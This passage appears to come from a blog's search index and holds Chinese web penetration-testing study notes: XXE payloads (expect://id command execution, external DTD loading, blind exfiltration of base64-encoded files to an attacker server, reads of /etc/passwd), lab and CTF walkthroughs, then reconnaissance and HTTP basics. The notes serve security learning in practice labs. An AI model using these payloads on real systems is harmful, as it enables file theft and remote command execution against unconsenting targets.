+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="引入外部实体dtd"><a href="#引入外部实体dtd" class="headerlink" title="引入外部实体dtd"></a>引入外部实体dtd</h3><p>类似于远程文件包含 ，相当于是在自己的服务器上放上一个包含恶意xml语句的evil2.dtd文件，然后让服务器去访问，服务器便会执行dtd文件里的代码</p>
+<p>条件：对方服务器未禁止外部实体引用 </p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx.xxx:8081/evil2.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%fule;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">send</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="无回现-读文件"><a href="#无回现-读文件" class="headerlink" title="无回现-读文件"></a>无回现-读文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.xxx.xxx:8081/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">test.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span></span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEN &#x27;http://192.168.xxx.xxx:8081/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
+
+<p>过程：由于没有回显，所以我们读取的文件内容无法显示出来。这里我们先用file（经过base64加密）把文件内容读出来，然后再去访问远程地址（自己的服务器）上的一个dtd文件，这个dtd里访问自己服务器上的文件并且使用了file作为参数，完成这一代码后，我们便可读取自己服务器的日志文件，查看解密参数，便得到文件内容（还可以在自己服务器上写一个参数来接收这个值，<code>http://192.168.xxx.xxx:8081/xxe.php?data=%file;</code>这里data接收了文件内容）</p>
+<h3 id="协议-读文件（绕过）"><a href="#协议-读文件（绕过）" class="headerlink" title="协议-读文件（绕过）"></a>协议-读文件（绕过）</h3><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE-绕过</a></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="xxe-lab-php靶场登录框xml数据传输"><a href="#xxe-lab-php靶场登录框xml数据传输" class="headerlink" title="xxe-lab-php靶场登录框xml数据传输"></a>xxe-lab-php靶场登录框xml数据传输</h3><p>地址：<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p>
+<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>首先是用burp抓取数据包，然后右键<code>Send to Spider</code>，进行爬取</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp1.png" alt="xxe-lab-php-wp1"></p>
+<p>在<code>History</code>中可以看到爬取结果</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp2.png" alt="xxe-lab-php-wp2"></p>
+<p>然后对爬取内容搜索<code>xml</code>关键字</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp3.png" alt="xxe-lab-php-wp3"></p>
+<p>找到可以提交xml的页面</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp4.png" alt="xxe-lab-php-wp4"></p>
+<p>再将数据包发送到Repeater构造恶意xml代码进行攻击</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp5.png" alt="xxe-lab-php-wp5"></p>
+<h3 id="CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改"><a href="#CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改" class="headerlink" title="CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改"></a>CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改</h3><p>地址：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
+<h4 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h4><p>先用burp抓包</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp1.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp1"></p>
+<p>再更改数据请求格式Content-Type的值为application/xml<br>然后POST提交下面的代码</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现flag可疑目录，flag应该在<code>/home/ctf/</code>下</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp2.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp2"></p>
+<p>于是修改payload，得到flag值</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp3.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp3"></p>
+<h3 id="vulnhub-xxe-lab-1"><a href="#vulnhub-xxe-lab-1" class="headerlink" title="vulnhub-xxe lab:1"></a>vulnhub-xxe lab:1</h3><p>靶场下载地址：<a href="https://www.vulnhub.com/entry/xxe-lab-1,254/">XXE Lab: 1</a></p>
+<h4 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h4><p>先用nmap进行扫描</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp1.png" alt="vulnhub-xxe lab1-wp1"></p>
+<p>结果如下：</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp2.png" alt="vulnhub-xxe lab1-wp2"></p>
+<p>访问后没发现什么，然后用扫描器去扫，发现有robots.txt文件可以访问，并且得到两个有效信息，<code>/xxe/</code>目录和<code>/admin.php</code>文件</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp3.png" alt="vulnhub-xxe lab1-wp3"></p>
+<p>先访问<code>/xxe/</code>，登录抓包，发现发送的是xml格式数据</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp4.png" alt="vulnhub-xxe lab1-wp4"></p>
+<p>将数据包发往<code>Repeater</code>，构造攻击语句发包</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>显示<code>xxe.php</code>base64加密后内容</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp5.png" alt="vulnhub-xxe lab1-wp5"></p>
+<p>发送到burp的<code>Send to Decoder</code>去解密</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp6.png" alt="vulnhub-xxe lab1-wp6"></p>
+<p>解密得到，但并没有发现什么有用信息</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp7.png" alt="vulnhub-xxe lab1-wp7"></p>
+<p>想到之前还有一个<code>admin.php</code>文件，于是用payload去读取<code>admin.php</code>，进行相同操作，得到用户名和密码，密码是md5加密的</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">用户名：administhebest</span><br><span class="line">密码：<span class="symbol">admin@</span><span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p>这里登录点要注意，是<code>admin.php</code>文件，我们应访问<code>/xxe/admin.php</code>，登进去后点击Flag</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp8.png" alt="vulnhub-xxe lab1-wp8"></p>
+<p>进去后跳转如下地址</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp9.png" alt="vulnhub-xxe lab1-wp9"></p>
+<p>说明有限制，我们接着用刚才的xxe漏洞去读这个文件<code>flagmeout.php</code></p>
+<p>注意该文件是在站点根部录下<code>./flagmeout.php</code></p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp10.png" alt="vulnhub-xxe lab1-wp10"></p>
+<p>解密后得到，这里是base32加密</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp11.png" alt="vulnhub-xxe lab1-wp11"></p>
+<p>网上查找base32解密后，得到一串base64加密，再解密后得到flag所在目录<code>/etc/flag.php</code></p>
+<p>再利用xxe漏洞去读，并解密</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp12.png" alt="vulnhub-xxe lab1-wp12"></p>
+<p>发现一串认不到的代码，从<code>$</code>符判断应该是php代码，我们找个php在线运行，把代码扔进去跑就行了，得到flag值</p>
+<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp13.png" alt="vulnhub-xxe lab1-wp13"></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>下载：<a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
+<p>文章：<a href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></p>
+<h2 id="修复与防御"><a href="#修复与防御" class="headerlink" title="修复与防御"></a>修复与防御</h2><p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/XXE%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E5%BE%A1.png" alt="XXE修复与防御"></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>XXE</tag>
+        <tag>XML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息收集</title>
+    <url>/2021/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<p><img src="/2021/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF.png" alt="信息收集思路"></p>
+<span id="more"></span>
+
+<h2 id="CDN-多网"><a href="#CDN-多网" class="headerlink" title="CDN(多网)"></a>CDN(多网)</h2><p>CDN(内容分发网络)通过遍布全国的缓存边缘节点、内部专用线路以及完善的网络路由调度机制为用户自动选择最佳网络访问路径，将源站的内容分发到最接近用户的网络边缘节点，解决用户访问速度慢的问题，提供全方位的更快、更稳定、更便捷的网络访问体验。</p>
+<h2 id="WAF-Web-Application-Firewall"><a href="#WAF-Web-Application-Firewall" class="headerlink" title="WAF(Web Application Firewall)"></a>WAF(Web Application Firewall)</h2><p>网站应用级入侵防御系统，web应用防火墙是通过一些列针对HTTP/HTTPS的安全册罗来专门为Web应用提供保护的一款产品</p>
+<h2 id="CMS-Content-Management-System"><a href="#CMS-Content-Management-System" class="headerlink" title="CMS(Content Management System)"></a>CMS(Content Management System)</h2><p>意为”内容管理系统”。 </p>
+<p>内容管理系统（content management system，CMS）是一种位于WEB 前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、Intranet以及Extranet网站的信息。</p>
+<p>内容管理还可选地提供内容抓取工具，将第三方信息来源，比如将文本文件、HTML网页、Web服务、关系数据库等的内容自动抓取，并经分析处理后放到自身的内容库中。</p>
+<p>随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端。</p>
+<h2 id="站点搭建"><a href="#站点搭建" class="headerlink" title="站点搭建"></a>站点搭建</h2><h3 id="目录站点"><a href="#目录站点" class="headerlink" title="目录站点"></a>目录站点</h3><p>/bbs/    论坛</p>
+<h3 id="端口站点"><a href="#端口站点" class="headerlink" title="端口站点"></a>端口站点</h3><p>:8080</p>
+<p>通过开放的端口，分析站点开启了哪些服务</p>
+<h3 id="子域名站点"><a href="#子域名站点" class="headerlink" title="子域名站点"></a>子域名站点</h3><p>同一ip：</p>
+<p><strong>bbs</strong>.goodlift.net</p>
+<p><strong>www</strong>.goodlift.net</p>
+<p>不同ip：</p>
+<p><a href="http://www.etiantian.com/">www.etiantian.com</a></p>
+<p>web.etiantian.com</p>
+<h3 id="类似域名站点"><a href="#类似域名站点" class="headerlink" title="类似域名站点"></a>类似域名站点</h3><h3 id="旁注，C段站点"><a href="#旁注，C段站点" class="headerlink" title="旁注，C段站点"></a>旁注，C段站点</h3><h4 id="旁注：同服务器不同站点"><a href="#旁注：同服务器不同站点" class="headerlink" title="旁注：同服务器不同站点"></a>旁注：同服务器不同站点</h4><p>前提条件：该服务器有多个站点</p>
+<p>例如：192.168.1.100</p>
+<p>​            <a href="http://www.a.com/">www.a.com</a></p>
+<p>​            <a href="http://www.b.com/">www.b.com</a></p>
+<p>可以通过找到b的漏洞来攻击a站点</p>
+<h4 id="C段：同网段不同服务器不同站点（困难）"><a href="#C段：同网段不同服务器不同站点（困难）" class="headerlink" title="C段：同网段不同服务器不同站点（困难）"></a>C段：同网段不同服务器不同站点（困难）</h4><p>前提条件：独立站点服务器，该服务器只有一个站点利用</p>
+<p>例如：192.168.1.100</p>
+<p>​            <a href="http://www.a.com/">www.a.com</a></p>
+<p>​            </p>
+<p>例如：192.168.1.101</p>
+<p>​            <a href="http://www.b.com/">www.b.com</a></p>
+<p>​            </p>
+<h3 id="搭建软件特征站点"><a href="#搭建软件特征站点" class="headerlink" title="搭建软件特征站点"></a>搭建软件特征站点</h3><p>phpstudy、宝塔等</p>
+<p>shodan（一款黑暗搜索引擎）</p>
+<h2 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h2><p><a href="https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg?_at_=1626861335971">漏了个大洞.zip_免费高速下载|百度网盘-分享无限制 (baidu.com)</a>提取码：0b7b</p>
+<p><a href="http://www.xyaz.cn/">【逍遥安卓模拟器】安卓模拟器电脑版_安卓模拟器哪个好用_逍遥安卓模拟器下载官网 (xyaz.cn)</a></p>
+<h2 id="信息搜集思路"><a href="#信息搜集思路" class="headerlink" title="信息搜集思路"></a>信息搜集思路</h2><p>找到目标域名，用百度、Google搜索suit:+域名，得到</p>
+<h2 id="资产监控"><a href="#资产监控" class="headerlink" title="资产监控"></a>资产监控</h2><p>layer子域名挖掘机 4.2版本</p>
+<p>如果存在CDN，用外网去ping可得到真实ip地址，工具<a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业的 IP 地址库_IPIP.NET</a></p>
+<p>查证书的<a href="https://crt.sh(也涉及一些子域名)/">https://crt.sh（也涉及一些子域名）</a></p>
+<p>查询DNS记录<a href="https://dnsdb.io/zh-cn/">DNSDB</a></p>
+<p><a href="https://sct.ftqq.com/">Server酱·Turbo版 (ftqq.com)</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础入门</title>
+    <url>/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<p>基础入门</p>
+<span id="more"></span>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="Host和DNS的关系"><a href="#Host和DNS的关系" class="headerlink" title="Host和DNS的关系"></a>Host和DNS的关系</h3><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><p>asp <strong>php</strong> aspx jsp <strong>javaweb</strong> pl <strong>py</strong> cgi</p>
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>免杀</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>网站源码：分脚本类型、应用方向</p>
+<p>操作系统：windows、linux</p>
+<p>中间件（搭建平台）：apache、iis、tomcat、nginx</p>
+<p>数据库：access、mysql、mssql、oracle、sybase、db2、postsql</p>
+<p>​    </p>
+<h2 id="web安全相关漏洞"><a href="#web安全相关漏洞" class="headerlink" title="web安全相关漏洞"></a>web安全相关漏洞</h2><h3 id="web源码类对应漏洞"><a href="#web源码类对应漏洞" class="headerlink" title="web源码类对应漏洞"></a>web源码类对应漏洞</h3><p>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化</p>
+<h3 id="web中间件对应漏洞"><a href="#web中间件对应漏洞" class="headerlink" title="web中间件对应漏洞"></a>web中间件对应漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层对应漏洞"><a href="#web系统层对应漏洞" class="headerlink" title="web系统层对应漏洞"></a>web系统层对应漏洞</h3><p>提权</p>
+<h3 id="其他第三方漏洞"><a href="#其他第三方漏洞" class="headerlink" title="其他第三方漏洞"></a>其他第三方漏洞</h3><h3 id="APP或PC应用结合类"><a href="#APP或PC应用结合类" class="headerlink" title="APP或PC应用结合类"></a>APP或PC应用结合类</h3><p>有些app是网页套壳，可以通过工具逆向出相关网页，进行web攻击</p>
+<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><h3 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h3><p><img src="./%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/http%E4%B8%8Ehttps.png" alt="http与https"></p>
+<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p>建立连接-&gt;发送请求数据包-&gt;返回响应数据包-&gt;关闭连接</p>
+<h4 id="https"><a href="#https" class="headerlink" title="https"></a>https</h4><p><img src="./%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/https.png" alt="https"></p>
+<h3 id="Request请求数据包"><a href="#Request请求数据包" class="headerlink" title="Request请求数据包"></a>Request请求数据包</h3><h4 id="请求行：请求类型-请求资源路径、协议的版本和类型"><a href="#请求行：请求类型-请求资源路径、协议的版本和类型" class="headerlink" title="请求行：请求类型/请求资源路径、协议的版本和类型"></a>请求行：请求类型/请求资源路径、协议的版本和类型</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E8%A1%8C.png" alt="请求行"></p>
+<p>用burp改包成POST传参时，需要添加<code>Content-Type: application/x-www-form-urlencoded</code>，并且空一行填入参数值</p>
+<h4 id="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"><a href="#请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义" class="headerlink" title="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"></a>请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-1.png" alt="请求头-1"></p>
+<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-2.png" alt="请求头-2"></p>
+<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-3.png" alt="请求头-3"></p>
+<h4 id="空行：请求头与请求实体之间用一个空行隔开"><a href="#空行：请求头与请求实体之间用一个空行隔开" class="headerlink" title="空行：请求头与请求实体之间用一个空行隔开"></a>空行：请求头与请求实体之间用一个空行隔开</h4><p>最后一个请求头标之后，发送回车符和退行，通知服务器以下不再有头标</p>
+<h4 id="请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123"><a href="#请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123" class="headerlink" title="请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123"></a>请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123</h4><p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
+<h3 id="Response响应数据包"><a href="#Response响应数据包" class="headerlink" title="Response响应数据包"></a>Response响应数据包</h3><h4 id="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"><a href="#状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔" class="headerlink" title="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"></a>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</h4><h5 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h5><p>1xx    信息，请求收到，继续处理</p>
+<p>2xx    成功，行为被成功地执行</p>
+<p>3xx    重定向，为了完成请求，必须进一步执行的动作</p>
+<p>4xx    客户端错误</p>
+<p>5xx    服务端错误</p>
+<p>200    存在文件</p>
+<p>403    存在文件夹</p>
+<p>3xx    均可能存在</p>
+<p>404    不存在文件及文件夹</p>
+<p>500    均可能存在</p>
+<h4 id="响应头标：包含服务器类型、日期、长度、内容类型等"><a href="#响应头标：包含服务器类型、日期、长度、内容类型等" class="headerlink" title="响应头标：包含服务器类型、日期、长度、内容类型等"></a>响应头标：包含服务器类型、日期、长度、内容类型等</h4><p>和请求头标一样，它们指出服务器的功能，标识出相应的细节</p>
+<h4 id="空行响应头与响应体之间用空行隔开"><a href="#空行响应头与响应体之间用空行隔开" class="headerlink" title="空行响应头与响应体之间用空行隔开"></a>空行响应头与响应体之间用空行隔开</h4><p>最后一个响应头标之后是一个空行，发送回车符和退行，通知服务器以下不再有头标</p>
+<h4 id="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"><a href="#响应数据：浏览器会将实体内容中的数据取出来，生成相应页面" class="headerlink" title="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"></a>响应数据：浏览器会将实体内容中的数据取出来，生成相应页面</h4><p>HTML文档和图像等，也就是HTML本身</p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/web%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.png" alt="web攻击思路"></p>
+<p>ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
+<p>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
+<p>开源，为开源问题，框架（找框架漏洞）非框架（找代码漏洞）问题，关于CMS（开源程序，能在网上找到源码，可在网上查找这些开源代码的漏洞）识别问题及后续等</p>
+<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF.png" alt="渗透思路"></p>
+<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>判断系统：在URL中替换大小写，win下不区分，liunx下区分</p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>ASP+Access</p>
+<p>php+mysql</p>
+<p>aspx+mssql</p>
+<p>jsp+mssql,oracle</p>
+<p>python+mongodb</p>
+<h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><p>mysql    3306</p>
+<p>oracle    1521</p>
+<p>sqlsever    1433</p>
+<h2 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h2><p>实际应用URL地址参数加密</p>
+<p>搜索特定关键字加密字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:id=MQ==</span><br><span class="line">MQ==是BASE64编码的1</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式</title>
+    <url>/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<blockquote>
